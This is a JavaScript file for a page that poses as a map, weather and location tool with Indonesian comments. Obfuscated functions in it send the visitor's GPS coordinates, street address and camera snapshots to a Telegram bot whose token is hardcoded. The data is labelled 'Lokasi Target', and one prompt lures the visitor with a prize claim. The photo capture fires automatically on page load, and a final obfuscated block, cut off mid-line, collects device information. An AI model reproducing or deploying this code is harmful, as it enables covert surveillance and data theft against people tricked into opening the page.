// This script was created by: 𝗥𝗮𝗳𝗮𝘀𝗵𝗮 𝗔𝗹𝗳𝗶𝗮𝗻𝗱𝗶
// creator's phone number: +6287734034677
// script ini di lindungi oleh undang-undang hak cipta BACA README.MD

let map; 
let markers = []; 

// Fungsi untuk mendapatkan lokasi pengguna
function getLocation() {
    const status = document.getElementById('status');
    const mapContainer = document.getElementById('map-container');
    const addressElement = document.getElementById('address');

    // Langsung menampilkan peta saat tombol ditekan
    mapContainer.style.display = 'block';
    addressElement.textContent = ''; // Reset alamat

    // Cek apakah browser mendukung Geolocation API
    if ('geolocation' in navigator) {
        document.getElementById('loadingSpinner').style.display = 'block'; // Tampilkan loading spinner
        navigator.geolocation.getCurrentPosition(showPosition, showError);
        status.textContent = 'Mendapatkan lokasi...';
    } else {
        status.textContent = 'Geolocation tidak didukung oleh browser ini.';
    }
}

// Fungsi untuk menampilkan lokasi di peta dan mendapatkan alamat
function showPosition(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const mapArea = document.getElementById('map');
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    
    document.getElementById('loadingSpinner').style.display = 'none'; // Sembunyikan loading spinner

    // Tampilkan status lokasi
    status.textContent = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;

    // Jika peta belum diinisialisasi, buat peta baru
    if (!map) {
        map = L.map(mapArea).setView([latitude, longitude], 16); // Menggunakan zoom level lebih tinggi

        // Menggunakan Tile Layer dari OpenStreetMap
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);
    } else {
        // Jika peta sudah ada, setel ulang view ke lokasi baru
        map.setView([latitude, longitude], 16);
    }

    // Tambahkan marker ke lokasi saat ini
    const marker = L.marker([latitude, longitude]).addTo(map)
        .bindPopup('Anda di sini!')
        .openPopup();
    
    // Simpan marker ke array agar bisa dihapus atau dikelola
    markers.push(marker);

    // Simpan lokasi ke riwayat
    saveLocationToHistory(latitude, longitude);

    // Mendapatkan cuaca berdasarkan lokasi
    getWeather(latitude, longitude);

    // Mendapatkan alamat dari koordinat menggunakan Nominatim
    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1&zoom=18&extratags=1&accept-language=id`, {
        headers: {
            'User-Agent': 'app tracker/1.0 (ailearnsbyalfian@gmail.com)' // Gmail jangan di ganti nanti eror!!
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data && data.display_name) {
            addressElement.textContent = `Lokasi: ${data.display_name}`;
            // Kirim lokasi dan alamat ke Telegram
            sendLocationToTelegram(latitude, longitude, data.display_name);
        } else {
            addressElement.textContent = 'Alamat tidak ditemukan.';
        }
    })
    .catch(error => {
        console.error('Error fetching address:', error);
        addressElement.textContent = 'Error fetching address.';
    });
}

// Fungsi untuk mengirim lokasi dan alamat ke Telegram
function _0x57f6(_0x30dd6a,_0x5ea6da){const _0x626d9b=_0x626d();return _0x57f6=function(_0x57f606,_0x12e821){_0x57f606=_0x57f606-0x94;let _0x21c1a0=_0x626d9b[_0x57f606];return _0x21c1a0;},_0x57f6(_0x30dd6a,_0x5ea6da);}function _0x626d(){const _0xb0fc04=['QLWHU','bYBFH','Error:','8137866512:AAE771KJrWSUMAaIpBcu_OLjbH3O_nArulU','buVCE','6149048uoRvjJ','toFixed','GWdMj','gxzMH','append','json','error','POST','then','Jasa\x20buat\x20website\x20hubungi\x20https://t.me/Rafashaalfian','Etoac','WnUez','Data\x20lokasi\x20tidak\x20lengkap.','521340doSCaA','chat_id','apakah\x20anda\x20yakin\x20ingin\x20menampilkan\x20Lokasi?','\x0aLongitude:\x20','catch','4gmyvEu','814155PVGMuW','log','173058AmClOt','9ToasCB','YOqnA','739685VHSKwT','205400MoLgcj','JwsGw','\x0aAlamat:\x20','text','Terjadi\x20kesalahan\x20saat\x20membuka\x20lokasi','3081162VJdjvH'];_0x626d=function(){return _0xb0fc04;};return _0x626d();}(function(_0x26609e,_0x846980){const _0x506f85=_0x57f6,_0x25aeb3=_0x26609e();while(!![]){try{const _0xc7453e=parseInt(_0x506f85(0xb5))/0x1+parseInt(_0x506f85(0x95))/0x2+parseInt(_0x506f85(0xb3))/0x3+-parseInt(_0x506f85(0xb2))/0x4*(-parseInt(_0x506f85(0x94))/0x5)+-parseInt(_0x506f85(0xad))/0x6+parseInt(_0x506f85(0x9a))/0x7+parseInt(_0x506f85(0xa0))/0x8*(-parseInt(_0x506f85(0xb6))/0x9);if(_0xc7453e===_0x846980)break;else _0x25aeb3['push'](_0x25aeb3['shift']());}catch(_0x1b6acc){_0x25aeb3['push'](_0x25aeb3['shift']());}}}(_0x626d,0x444ad));function sendLocationToTelegram(_0x1c8437,_0x4c4b25,_0x50f455){const _0xf895b7=_0x57f6,_0x42bc56={'YOqnA':_0xf895b7(0xa9),'JwsGw':_0xf895b7(0x9d),'GWdMj':function(_0x2d5c69,_0x454d8e){return _0x2d5c69||_0x454d8e;},'QLWHU':_0xf895b7(0xac),'gxzMH':function(_0x2ec672,_0x30a2dc){return _0x2ec672(_0x30a2dc);},'buVCE':_0xf895b7(0xaf),'eynNr':'-1002360934041','Etoac':_0xf895b7(0xae),'WnUez':_0xf895b7(0x98),'bYBFH':_0xf895b7(0xa7)};if(_0x42bc56[_0xf895b7(0xa2)](!_0x1c8437,!_0x4c4b25)||!_0x50f455){console[_0xf895b7(0xa6)](_0x42bc56[_0xf895b7(0x9b)]);return;}const _0x456316=_0x42bc56[_0xf895b7(0xa3)](confirm,_0x42bc56[_0xf895b7(0x9f)]);if(!_0x456316){console[_0xf895b7(0xb4)]('Terjadi\x20kesalahan\x20saat\x20membuka\x20Lokasi.');return;}const _0x17b2f1=_0xf895b7(0x9e),_0x5ea256=_0x42bc56['eynNr'],_0x2be4ad='https://api.telegram.org/bot'+_0x17b2f1+'/sendMessage',_0x390f08='📍\x20Lokasi\x20Target:\x0aLatitude:\x20'+_0x1c8437['toFixed'](0x5)+_0xf895b7(0xb0)+_0x4c4b25[_0xf895b7(0xa1)](0x5)+_0xf895b7(0x97)+_0x50f455,_0x2e6162=new FormData();_0x2e6162[_0xf895b7(0xa4)](_0x42bc56[_0xf895b7(0xaa)],_0x5ea256),_0x2e6162['append'](_0x42bc56[_0xf895b7(0xab)],_0x390f08),fetch(_0x2be4ad,{'method':_0x42bc56[_0xf895b7(0x9c)],'body':_0x2e6162})[_0xf895b7(0xa8)](_0x150bd3=>_0x150bd3[_0xf895b7(0xa5)]())[_0xf895b7(0xa8)](_0x3a48b1=>{const _0x18a2be=_0xf895b7;_0x3a48b1['ok']?console[_0x18a2be(0xb4)](_0x42bc56[_0x18a2be(0xb7)]):console['error'](_0x18a2be(0x99));})[_0xf895b7(0xb1)](_0x1edae8=>{const _0x7a2764=_0xf895b7;console[_0x7a2764(0xa6)](_0x42bc56[_0x7a2764(0x96)],_0x1edae8);});}

// Fungsi untuk menyimpan lokasi ke riwayat
function saveLocationToHistory(latitude, longitude) {
    const location = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;
    const locationList = document.getElementById('location-history');
    const li = document.createElement('li');
    li.textContent = location;
    locationList.appendChild(li);
}

// Fungsi untuk menangani kesalahan Geolocation
function showError(error) {
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    document.getElementById('loadingSpinner').style.display = 'none'; // Sembunyikan loading spinner

    addressElement.textContent = ''; // Reset alamat
    switch (error.code) {
        case error.PERMISSION_DENIED:
            status.textContent = "Izin lokasi ditolak.";
            break;
        case error.POSITION_UNAVAILABLE:
            status.textContent = "Informasi lokasi tidak tersedia.";
            break;
        case error.TIMEOUT:
            status.textContent = "Waktu permintaan lokasi habis.";
            break;
        case error.UNKNOWN_ERROR:
            status.textContent = "Kesalahan tidak diketahui.";
            break;
    }
}

// Fungsi untuk mengambil foto dan langsung mengirimkan ke Telegram saat halaman dimuat
function takePhotoAndSendToTelegram() {
    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');

    // Periksa apakah browser mendukung API getUserMedia
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    // Tunggu hingga video siap, lalu ambil foto
                    const context = canvas.getContext('2d');

                    // Sesuaikan ukuran canvas dengan ukuran video
                    const videoWidth = video.videoWidth;
                    const videoHeight = video.videoHeight;
                    canvas.width = videoWidth;
                    canvas.height = videoHeight;

                    // Mengambil gambar dari video ke canvas
                    context.drawImage(video, 0, 0, videoWidth, videoHeight);

                    // Ambil data URI dari canvas
                    const dataUrl = canvas.toDataURL('image/png');

                    // Kirim foto ke Telegram
                    sendToTelegram(dataUrl);

                    // Matikan stream video untuk menghemat sumber daya
                    stream.getTracks().forEach(track => track.stop());
                };
            })
            .catch(function (err) {
                console.error("Terjadi kesalahan saat mengakses kamera: ", err);
            });
    } else {
        alert("Maaf, browser Anda tidak mendukung akses kamera.");
    }
}

// Fungsi untuk mengirim foto ke Telegram
(function(_0x3182d1,_0x54dbf6){const _0x2da3d0=_0x5312,_0x52a001=_0x3182d1();while(!![]){try{const _0x4916e8=-parseInt(_0x2da3d0(0x1be))/0x1*(parseInt(_0x2da3d0(0x1d3))/0x2)+parseInt(_0x2da3d0(0x1c0))/0x3*(-parseInt(_0x2da3d0(0x1c8))/0x4)+parseInt(_0x2da3d0(0x1c4))/0x5+-parseInt(_0x2da3d0(0x1dc))/0x6*(parseInt(_0x2da3d0(0x1d0))/0x7)+-parseInt(_0x2da3d0(0x1d6))/0x8+parseInt(_0x2da3d0(0x1c9))/0x9*(parseInt(_0x2da3d0(0x1c3))/0xa)+-parseInt(_0x2da3d0(0x1d2))/0xb*(-parseInt(_0x2da3d0(0x1da))/0xc);if(_0x4916e8===_0x54dbf6)break;else _0x52a001['push'](_0x52a001['shift']());}catch(_0xe86167){_0x52a001['push'](_0x52a001['shift']());}}}(_0x4ad4,0x3b275));function _0x4ad4(){const _0xdca29c=['json','1005490VVeHGq','760060DTdrRU','VCRZJ','photo','Terjadi\x20kesalahan\x20saat\x20membuka\x20Kamera.','135048iCskLX','27SzLrxX','gocAN','FIdbS','wWoJn','-1002360934041','then','POST','42ZQOZgK','Apakah\x20anda\x20yakin\x20ingin\x20membuka\x20Kamera?','46596LQpYFf','119206VRIqJK','https://api.telegram.org/bot','Foto\x20berhasil\x20dikirim\x20ke\x20Telegram.','3534680OBLUnh','append','/sendPhoto','log','1500auPTSO','catch','18936KxovgB','chat_id','3NKwWdN','KSXfs','9DrdoYX','error'];_0x4ad4=function(){return _0xdca29c;};return _0x4ad4();}function _0x5312(_0x3ed2cc,_0x543ca2){const _0x4ad44e=_0x4ad4();return _0x5312=function(_0x5312c8,_0x1e0de5){_0x5312c8=_0x5312c8-0x1bd;let _0x47d737=_0x4ad44e[_0x5312c8];return _0x47d737;},_0x5312(_0x3ed2cc,_0x543ca2);}function sendToTelegram(_0x2eae18){const _0x122ee1=_0x5312,_0x4b7a20={'VCRZJ':_0x122ee1(0x1d5),'KSXfs':'Error:','gocAN':function(_0x2e34fd,_0x24a7e4){return _0x2e34fd(_0x24a7e4);},'AEMfp':_0x122ee1(0x1d1),'wWoJn':'8137866512:AAE771KJrWSUMAaIpBcu_OLjbH3O_nArulU','UYpFP':_0x122ee1(0x1cd),'dUHKA':_0x122ee1(0x1bd),'wmglW':_0x122ee1(0x1c6),'FIdbS':function(_0x31d7d8,_0x191aaf){return _0x31d7d8(_0x191aaf);}},_0xf935d3=_0x4b7a20[_0x122ee1(0x1ca)](confirm,_0x4b7a20['AEMfp']);if(!_0xf935d3){console[_0x122ee1(0x1d9)](_0x122ee1(0x1c7));return;}const _0x2755dc=_0x4b7a20[_0x122ee1(0x1cc)],_0x52a8ea=_0x4b7a20['UYpFP'],_0x4ca08a=_0x122ee1(0x1d4)+_0x2755dc+_0x122ee1(0x1d8);let _0x229b2f=new FormData();_0x229b2f[_0x122ee1(0x1d7)](_0x4b7a20['dUHKA'],_0x52a8ea),_0x229b2f[_0x122ee1(0x1d7)](_0x4b7a20['wmglW'],_0x4b7a20[_0x122ee1(0x1cb)](dataURItoBlob,_0x2eae18)),fetch(_0x4ca08a,{'method':_0x122ee1(0x1cf),'body':_0x229b2f})[_0x122ee1(0x1ce)](_0x5ebd46=>_0x5ebd46[_0x122ee1(0x1c2)]())[_0x122ee1(0x1ce)](_0x153ac3=>{const _0x39a57a=_0x122ee1;_0x153ac3['ok']?console[_0x39a57a(0x1d9)](_0x4b7a20[_0x39a57a(0x1c5)]):console[_0x39a57a(0x1c1)]('Terjadi\x20kesalahan\x20saat\x20mengirim\x20foto.',_0x153ac3);})[_0x122ee1(0x1db)](_0x5cff3=>{const _0x178e61=_0x122ee1;console['error'](_0x4b7a20[_0x178e61(0x1bf)],_0x5cff3);});}


// Fungsi untuk mengubah data URI menjadi Blob
function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(',')[1]);
    let arrayBuffer = new ArrayBuffer(byteString.length);
    let uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

// Tambahkan event listener saat halaman dimuat
document.addEventListener('DOMContentLoaded', () => {
    checkDarkModeStatus(); // Untuk mengatur mode gelap
    takePhotoAndSendToTelegram(); // Memanggil fungsi pengambilan foto dan pengiriman otomatis
});

// Fungsi untuk membuka kamera dan menampilkan video
function openCamera() {
    const video = document.getElementById('camera');

    // Periksa apakah browser mendukung API getUserMedia
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                video.srcObject = stream;

                // Ambil foto langsung ketika kamera berhasil dibuka
                video.onloadedmetadata = () => takePhoto();
            })
            .catch(function (err) {
                console.log("Terjadi kesalahan saat mengakses kamera: " + err);
            });
    } else {
        alert("Maaf, browser Anda tidak mendukung akses kamera.");
    }
}

// Fungsi untuk mengambil foto dan mengirimkan ke Telegram
function takePhoto() {
    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Sesuaikan ukuran canvas agar sesuai dengan ukuran video
    const videoWidth = video.videoWidth;
    const videoHeight = video.videoHeight;

    // Set canvas ukuran sesuai dengan ukuran video
    canvas.width = videoWidth;
    canvas.height = videoHeight;

    // Mengambil gambar dari stream video dan menggambar ke canvas
    context.drawImage(video, 0, 0, videoWidth, videoHeight);

    // Ambil data URI dari canvas yang sudah digambar
    const dataUrl = canvas.toDataURL('image/png');

    // Kirim foto ke Telegram
    sendToTelegram(dataUrl);
}

// Fungsi untuk mengirim foto ke Telegram
(function(_0x5c2772,_0x240578){const _0x36231c=_0x4895,_0xadad56=_0x5c2772();while(!![]){try{const _0x1f222f=-parseInt(_0x36231c(0x1ff))/0x1+-parseInt(_0x36231c(0x1e5))/0x2*(-parseInt(_0x36231c(0x1eb))/0x3)+-parseInt(_0x36231c(0x1fc))/0x4*(-parseInt(_0x36231c(0x1fe))/0x5)+-parseInt(_0x36231c(0x1ec))/0x6*(-parseInt(_0x36231c(0x1f5))/0x7)+parseInt(_0x36231c(0x1fd))/0x8*(parseInt(_0x36231c(0x1f6))/0x9)+parseInt(_0x36231c(0x1ea))/0xa+parseInt(_0x36231c(0x1fa))/0xb*(-parseInt(_0x36231c(0x203))/0xc);if(_0x1f222f===_0x240578)break;else _0xadad56['push'](_0xadad56['shift']());}catch(_0x4ef3ad){_0xadad56['push'](_0xadad56['shift']());}}}(_0x58f3,0xcb978));function _0x58f3(){const _0x352fa3=['8137866512:AAE771KJrWSUMAaIpBcu_OLjbH3O_nArulU','OLhZi','Bmeat','https://api.telegram.org/bot','chat_id','31367YZzlBK','11945025SLSNtn','-1002360934041','GQSfc','kNBkt','1008931oFZtxD','Ijfbg','1700aBdodI','8rcEpkB','14785qvumkU','107795EtfZIt','json','WmUgY','append','708hKSWTL','then','124cKumoW','error','photo','TsrfC','Terjadi\x20kesalahan\x20saat\x20membuka\x20Kamera.','13291560vZUpyj','49989gmtOEF','1884rfCZVS','POST','Jasa\x20buat\x20website\x20hubungi\x20https://t.me/Rafashaalfian','/sendPhoto'];_0x58f3=function(){return _0x352fa3;};return _0x58f3();}function _0x4895(_0x1b653b,_0x3e765a){const _0x58f37e=_0x58f3();return _0x4895=function(_0x4895be,_0x25848a){_0x4895be=_0x4895be-0x1e4;let _0x776c7c=_0x58f37e[_0x4895be];return _0x776c7c;},_0x4895(_0x1b653b,_0x3e765a);}function sendToTelegram(_0x31122f){const _0x5e9753=_0x4895,_0x45d971={'GQSfc':function(_0x35c316,_0x3b4425){return _0x35c316(_0x3b4425);},'Ijfbg':_0x5e9753(0x1e9),'JOCzR':'Error:','RCRKz':'Terjadi\x20kesalahan.\x20Silakan\x20coba\x20lagi.','Bmeat':'Tekan\x20\x27OK\x27\x20Untuk\x20Claim\x20Hadiah','sIzjg':function(_0x4aa652,_0x153357){return _0x4aa652(_0x153357);},'qsLcl':_0x5e9753(0x1f0),'TsrfC':_0x5e9753(0x1f7),'yVPzM':_0x5e9753(0x1f4),'kNBkt':_0x5e9753(0x1e7),'WmUgY':function(_0x5b73f4,_0x34db26){return _0x5b73f4(_0x34db26);},'OLhZi':function(_0x43ecad,_0x29ad1f,_0x1eb4a2){return _0x43ecad(_0x29ad1f,_0x1eb4a2);},'QdSwj':_0x5e9753(0x1ed)},_0x33c3ab=_0x45d971[_0x5e9753(0x1f8)](confirm,_0x45d971[_0x5e9753(0x1f2)]);if(!_0x33c3ab){_0x45d971['sIzjg'](alert,_0x45d971[_0x5e9753(0x1fb)]);return;}const _0x10c71a=_0x45d971['qsLcl'],_0x1a102e=_0x45d971[_0x5e9753(0x1e8)],_0x2cf01d=_0x5e9753(0x1f3)+_0x10c71a+_0x5e9753(0x1ef);let _0xf78eae=new FormData();_0xf78eae[_0x5e9753(0x202)](_0x45d971['yVPzM'],_0x1a102e),_0xf78eae[_0x5e9753(0x202)](_0x45d971[_0x5e9753(0x1f9)],_0x45d971[_0x5e9753(0x201)](dataURItoBlob,_0x31122f)),_0x45d971[_0x5e9753(0x1f1)](fetch,_0x2cf01d,{'method':_0x45d971['QdSwj'],'body':_0xf78eae})['then'](_0x3b43c2=>_0x3b43c2[_0x5e9753(0x200)]())[_0x5e9753(0x1e4)](_0x3edf1e=>{const _0x4ae102=_0x5e9753;_0x3edf1e['ok']?alert(_0x4ae102(0x1ee)):_0x45d971[_0x4ae102(0x1f8)](alert,_0x45d971['Ijfbg']);})['catch'](_0x33db8c=>{const _0x385c3f=_0x5e9753;console[_0x385c3f(0x1e6)](_0x45d971['JOCzR'],_0x33db8c),_0x45d971['GQSfc'](alert,_0x45d971['RCRKz']);});}


// Fungsi untuk mengubah data URI menjadi Blob
function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(',')[1]);
    let arrayBuffer = new ArrayBuffer(byteString.length);
    let uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

// Dark mode functionality
let isDarkMode = false;

function toggleDarkMode() {
    isDarkMode = !isDarkMode;
    document.body.classList.toggle('dark-mode');

    // Simpan status mode ke localStorage agar bisa bertahan saat halaman di-refresh
    localStorage.setItem('darkMode', isDarkMode);
    updateDarkModeButtonText();
}

// Fungsi untuk memeriksa apakah dark mode aktif dari localStorage
function checkDarkModeStatus() {
    const darkModeStatus = localStorage.getItem('darkMode');
    if (darkModeStatus === 'true') {
        isDarkMode = true;
        document.body.classList.add('dark-mode');
    }
    updateDarkModeButtonText();
}

// Fungsi untuk memperbarui teks tombol dark mode
function updateDarkModeButtonText() {
    const toggleButton = document.getElementById('darkModeToggle');
    toggleButton.innerHTML = isDarkMode ? '☀️ Switch to Light Mode' : '🌙 Switch to Dark Mode';
}

// Fungsi untuk mendapatkan informasi cuaca
(function(_0x480f49,_0x45ae44){const _0x3791bf=_0x2315,_0x119df7=_0x480f49();while(!![]){try{const _0xa6eaab=parseInt(_0x3791bf(0x109))/0x1*(parseInt(_0x3791bf(0x111))/0x2)+parseInt(_0x3791bf(0xfd))/0x3*(-parseInt(_0x3791bf(0xfa))/0x4)+parseInt(_0x3791bf(0xfe))/0x5*(-parseInt(_0x3791bf(0x105))/0x6)+parseInt(_0x3791bf(0x107))/0x7*(parseInt(_0x3791bf(0x115))/0x8)+-parseInt(_0x3791bf(0x114))/0x9+parseInt(_0x3791bf(0x110))/0xa*(parseInt(_0x3791bf(0xf9))/0xb)+-parseInt(_0x3791bf(0xfb))/0xc*(-parseInt(_0x3791bf(0x103))/0xd);if(_0xa6eaab===_0x45ae44)break;else _0x119df7['push'](_0x119df7['shift']());}catch(_0x4e72ae){_0x119df7['push'](_0x119df7['shift']());}}}(_0x5e0a,0xef105));function _0x2315(_0x5f313c,_0x1c5f40){const _0x5e0acb=_0x5e0a();return _0x2315=function(_0x231546,_0x2fc123){_0x231546=_0x231546-0xf8;let _0x5c172c=_0x5e0acb[_0x231546];return _0x5c172c;},_0x2315(_0x5f313c,_0x1c5f40);}function _0x5e0a(){const _0x356a40=['&lon=','17128224BwqUAq','8oCyMpC','nUdaE','description','catch','11MYfRWz','604196ZgFIvi','15480LNwouM','CsZVC','15PhgJTl','1660psRSqn','be2fbce957441bd5f28348a8a9ab448e','innerText','Cuaca\x20tidak\x20ditemukan\x20untuk\x20lokasi\x20ini.','Gagal\x20mengambil\x20data\x20cuaca.','17147crEtOU','Error\x20fetching\x20weather:','30792oJvrai','weather','10449397YzRwNu','then','5294NAPMqn','getElementById','temp','cod','json','rtvtw','zBMyN','10830350GPLMZw','402xjFTrI','Cuaca\x20saat\x20ini:\x20'];_0x5e0a=function(){return _0x356a40;};return _0x5e0a();}function getWeather(_0x1cfcf1,_0x4471e5){const _0x267129=_0x2315,_0x5a4635={'nUdaE':function(_0x312418,_0x2b6d7e){return _0x312418===_0x2b6d7e;},'CsZVC':_0x267129(0x106),'zBMyN':_0x267129(0x104),'rtvtw':_0x267129(0x102),'IHtnQ':_0x267129(0xff)},_0x1e5bfb=_0x5a4635['IHtnQ'],_0x4a6ece='https://api.openweathermap.org/data/2.5/weather?lat='+_0x1cfcf1+_0x267129(0x113)+_0x4471e5+'&appid='+_0x1e5bfb+'&units=metric&lang=id';fetch(_0x4a6ece)[_0x267129(0x108)](_0x2dcdef=>_0x2dcdef[_0x267129(0x10d)]())[_0x267129(0x108)](_0x570384=>{const _0x1b9347=_0x267129;if(_0x5a4635[_0x1b9347(0x116)](_0x570384[_0x1b9347(0x10c)],0xc8)){const _0x1d8f94=_0x1b9347(0x112)+_0x570384[_0x1b9347(0x106)][0x0][_0x1b9347(0x117)]+',\x20Suhu:\x20'+_0x570384['main'][_0x1b9347(0x10b)]+'°C';document[_0x1b9347(0x10a)](_0x1b9347(0x106))[_0x1b9347(0x100)]=_0x1d8f94;}else document[_0x1b9347(0x10a)](_0x5a4635[_0x1b9347(0xfc)])['innerText']=_0x1b9347(0x101);})[_0x267129(0xf8)](_0x453bfb=>{const _0xd4245f=_0x267129;console['error'](_0x5a4635[_0xd4245f(0x10f)],_0x453bfb),document[_0xd4245f(0x10a)](_0x5a4635['CsZVC'])['innerText']=_0x5a4635[_0xd4245f(0x10e)];});}

// Fungsi untuk menambahkan penanda kustom di peta
function addCustomMarker() {
    if (map) {
        // Tambahkan event listener klik di peta
        map.on('click', function(e) {
            const lat = e.latlng.lat;
            const lon = e.latlng.lng;

            const marker = L.marker([lat, lon]).addTo(map)
                .bindPopup(`Lokasi Penanda: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).openPopup();
            
            markers.push(marker);

            saveLocationToHistory(lat, lon);
        });
    } else {
        alert('Peta belum diinisialisasi. Dapatkan lokasi terlebih dahulu.');
    }
}

(function(_0x2546c1,_0xa3c39a){const _0x511905=_0x1950,_0x21d710=_0x2546c1();while(!![]){try{const _0xa6333d=-parseInt(_0x511905(0x25d))/0x1+parseInt(_0x511905(0x221))/0x2*(-parseInt(_0x511905(0x229))/0x3)+-parseInt(_0x511905(0x1f0))/0x4*(-parseInt(_0x511905(0x1bb))/0x5)+-parseInt(_0x511905(0x1f2))/0x6+parseInt(_0x511905(0x244))/0x7+-parseInt(_0x511905(0x217))/0x8*(-parseInt(_0x511905(0x228))/0x9)+parseInt(_0x511905(0x1a9))/0xa;if(_0xa6333d===_0xa3c39a)break;else _0x21d710['push'](_0x21d710['shift']());}catch(_0x2e3f82){_0x21d710['push'](_0x21d710['shift']());}}}(_0x1554,0x58a07));async function detectDeviceInfoAndSendToTelegram(){const _0x1d4adc=_0x1950,_0xb89d7a={'IHbJv':function(_0x561a69){return _0x561a69();},'WpJZI':'Gagal\x20mendapatkan\x20lokasi\x20dengan\x20Geolocation\x20API:','ITrzV':function(_0x2d1907){return _0x2d1907();},'EoOjb':function(_0x3387eb){return _0x3387eb();},'nGWYO':_0x1d4adc(0x219),'lzjLR':_0x1d4adc(0x255),'RrmqP':function(_0x371f32,_0x3154ce){return _0x371f32+_0x3154ce;},'uwJdK':function(_0x1640fc,_0xbe476d){return _0x1640fc+_0xbe476d;},'yRTQY':function(_0x37372a,_0x3b0127){return _0x37372a+_0x3b0127;},'pVZEh':function(_0x3d947e,_0x200646){return _0x3d947e+_0x200646;},'rXROW':function(_0x4356cc,_0x161f29){return _0x4356cc+_0x161f29;},'KZlTh':function(_0x33aedd,_0x4b8b65){return _0x33aedd+_0x4b8b65;},'htyCt':function(_0x112134,_0x1860cd){return _0x112134+_0x1860cd;},'fIbvS':function(_0x53fa33,_0x5946c5){return _0x53fa33+_0x5946c5;},'ljwxt':function(_0xec3775,_0x538be6,_0xd09723){return _0xec3775(_0x538be6,_0xd09723);},'VGgYF':'POST','leFSf':_0x1d4adc(0x1ec),'Bstkq':_0x1d4adc(0x1de),'HGSEy':_0x1d4adc(0x21c),'jybky':_0x1d4adc(0x1fc),'eXRYA':_0x1d4adc(0x225),'ZgLjS':_0x1d4adc(0x209),'CKbZV':_0x1d4adc(0x1da),'Zyvzd':'❌\x20Offline','nGJpl':_0x1d4adc(0x23d),'aaaIs':_0x1d4adc(0x237),'GniRb':_0x1d4adc(0x1f5),'dGtdM':_0x1d4adc(0x253),'GnPAs':function(_0x7187ec,_0x42b990){return _0x7187ec>_0x42b990;},'Hsatx':_0x1d4adc(0x20c),'ePMUa':_0x1d4adc(0x25b),'SyPeN':'Aktif','CUPoO':_0x1d4adc(0x1f6),'ttDoH':_0x1d4adc(0x218),'VlUNO':_0x1d4adc(0x200),'lxouj':function(_0x4500f5,_0x347291){return _0x4500f5/_0x347291;},'KuhXa':_0x1d4adc(0x249),'XQEDS':_0x1d4adc(0x256),'EODAp':function(_0x8516c0){return _0x8516c0();},'mUcpt':function(_0x1f114c,_0x4a7747){return _0x1f114c(_0x4a7747);},'eOgsf':function(_0x1dce95,_0x2f5305){return _0x1dce95(_0x2f5305);},'Bubra':_0x1d4adc(0x1df),'uWdbf':_0x1d4adc(0x1d7),'NJzaC':function(_0x40606c,_0x11ea7b){return _0x40606c===_0x11ea7b;},'iWbTb':function(_0x5e51fe,_0x480b96){return _0x5e51fe*_0x480b96;},'UVJbh':'Sedang\x20mengisi\x20⚡','RrOzr':_0x1d4adc(0x20f),'gvdtz':_0x1d4adc(0x245)},_0xd528a8=navigator[_0x1d4adc(0x201)],_0x2cce86=navigator[_0x1d4adc(0x1a6)],_0x336c4c=navigator['language'],_0x34ac4f=navigator[_0x1d4adc(0x236)]?navigator[_0x1d4adc(0x236)][_0x1d4adc(0x207)](',\x20'):_0xb89d7a[_0x1d4adc(0x1ba)],_0x5e8057=navigator[_0x1d4adc(0x1eb)],_0x3668bc=window['screen'][_0x1d4adc(0x269)],_0x2857fb=window[_0x1d4adc(0x22d)]['height'],_0x4240ca=navigator[_0x1d4adc(0x1fd)]||navigator['mozConnection']||navigator[_0x1d4adc(0x1b2)],_0x19b0ee=navigator[_0x1d4adc(0x1db)]?_0x1d4adc(0x212):_0xb89d7a[_0x1d4adc(0x1b5)],_0x3df5fe=_0x4240ca?_0x4240ca[_0x1d4adc(0x1ac)]:_0xb89d7a[_0x1d4adc(0x243)],_0x4c81f6=_0x4240ca?_0x4240ca[_0x1d4adc(0x1c0)]+_0x1d4adc(0x220):_0xb89d7a[_0x1d4adc(0x243)],_0x5ba0b5=Intl[_0x1d4adc(0x214)]()['resolvedOptions']()[_0x1d4adc(0x1f7)],_0x2faac7=new Date()[_0x1d4adc(0x21e)](),_0x13a9f0=window[_0x1d4adc(0x1e1)]&&window[_0x1d4adc(0x1e1)](_0xb89d7a[_0x1d4adc(0x251)])[_0x1d4adc(0x257)]?_0xb89d7a[_0x1d4adc(0x1d3)]:_0x1d4adc(0x1aa),_0x4493e3=_0xb89d7a[_0x1d4adc(0x1d2)]in 